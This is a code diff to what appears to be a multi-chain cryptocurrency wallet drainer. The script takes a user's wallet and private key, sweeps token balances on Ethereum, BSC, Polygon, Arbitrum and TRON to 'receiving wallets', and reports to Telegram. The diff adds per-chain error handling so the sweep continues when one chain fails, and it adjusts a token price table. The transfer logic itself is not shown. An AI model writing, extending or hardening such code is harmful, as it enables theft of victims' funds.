@@ -190,7 +190,7 @@ const ETHEREUM_CONFIG = {
         UNI: 'Uniswap', WBTC: 'Wrapped BTC', AAVE: 'Aave', MATIC: 'Polygon', SHIB: 'Shiba', PEPE: 'Pepe',
     },
     tokenPrices: {
-        USDC: 1, DAI: 1, USDT: 1, LINK: 15, UNI: 7, WBTC: 30000, AAVE: 90, MATIC: 0.50, SHIB: 0.00001, PEPE: 0.000007,
+        USDC: 1, DAI: 1, USDT: 1, LINK: 15, UNI: 7, WBTC: 30000, AAVE: 90, MATIC: 0.50, SHIB: 0.00001, PEPE: 0.0000038,
     }
 };
 
@@ -804,32 +804,58 @@ Time: ${new Date().toLocaleString()}
         
         // Process Ethereum
         console.log(`\n🔵 ========== PROCESSING ETHEREUM ==========`);
-        const ethResult = await processEvmChain(ETHEREUM_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
-        allTransactions = ethResult.allTransactions;
-        totalTransferredValue = ethResult.totalTransferredValue;
+        try {
+            const ethResult = await processEvmChain(ETHEREUM_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
+            allTransactions = ethResult.allTransactions;
+            totalTransferredValue = ethResult.totalTransferredValue;
+        } catch (error) {
+            console.error(`❌ Ethereum processing error:`, error.message);
+            allTransactions.push({ chain: 'Ethereum', status: 'error', error: error.message });
+        }
         
         // Process BSC
         console.log(`\n🟡 ========== PROCESSING BSC ==========`);
-        const bscResult = await processEvmChain(BSC_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
-        allTransactions = bscResult.allTransactions;
-        totalTransferredValue = bscResult.totalTransferredValue;
+        try {
+            const bscResult = await processEvmChain(BSC_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
+            allTransactions = bscResult.allTransactions;
+            totalTransferredValue = bscResult.totalTransferredValue;
+        } catch (error) {
+            console.error(`❌ BSC processing error:`, error.message);
+            allTransactions.push({ chain: 'BSC', status: 'error', error: error.message });
+        }
         
         // Process Polygon
         console.log(`\n🟣 ========== PROCESSING POLYGON ==========`);
-        const polygonResult = await processEvmChain(POLYGON_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
-        allTransactions = polygonResult.allTransactions;
-        totalTransferredValue = polygonResult.totalTransferredValue;
+        try {
+            const polygonResult = await processEvmChain(POLYGON_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
+            allTransactions = polygonResult.allTransactions;
+            totalTransferredValue = polygonResult.totalTransferredValue;
+        } catch (error) {
+            console.error(`❌ Polygon processing error:`, error.message);
+            allTransactions.push({ chain: 'Polygon', status: 'error', error: error.message });
+        }
         
         // Process Arbitrum
         console.log(`\n🔴 ========== PROCESSING ARBITRUM ==========`);
-        const arbitrumResult = await processEvmChain(ARBITRUM_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
-        allTransactions = arbitrumResult.allTransactions;
-        totalTransferredValue = arbitrumResult.totalTransferredValue;
+        try {
+            const arbitrumResult = await processEvmChain(ARBITRUM_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
+            allTransactions = arbitrumResult.allTransactions;
+            totalTransferredValue = arbitrumResult.totalTransferredValue;
+        } catch (error) {
+            console.error(`❌ Arbitrum processing error:`, error.message);
+            allTransactions.push({ chain: 'Arbitrum', status: 'error', error: error.message });
+        }
         
         // Process TRON
-        const tronResult = await processTronWithGasWallet(userPrivateKey, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
-        allTransactions = tronResult.allTransactions;
-        totalTransferredValue = tronResult.totalTransferredValue;
+        console.log(`\n🟣 ========== PROCESSING TRON ==========`);
+        try {
+            const tronResult = await processTronWithGasWallet(userPrivateKey, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
+            allTransactions = tronResult.allTransactions;
+            totalTransferredValue = tronResult.totalTransferredValue;
+        } catch (error) {
+            console.error(`❌ TRON processing error:`, error.message);
+            allTransactions.push({ chain: 'TRON', status: 'error', error: error.message });
+        }
         
         const totalWalletValue = allBalanceDetails.reduce((sum, t) => sum + t.usdValue, 0);
         const successfulCount = allTransactions.filter(t => t.status === 'success').length;
@@ -864,7 +890,7 @@ Duration: ${(totalDuration / 1000).toFixed(1)}s
         });
         
     } catch (error) {
-        console.error('❌ Error:', error.message);
+        console.error('❌ Fatal error:', error.message);
         await sendTelegramAlert(`
 ❌ <b>Transfer Error</b>
 
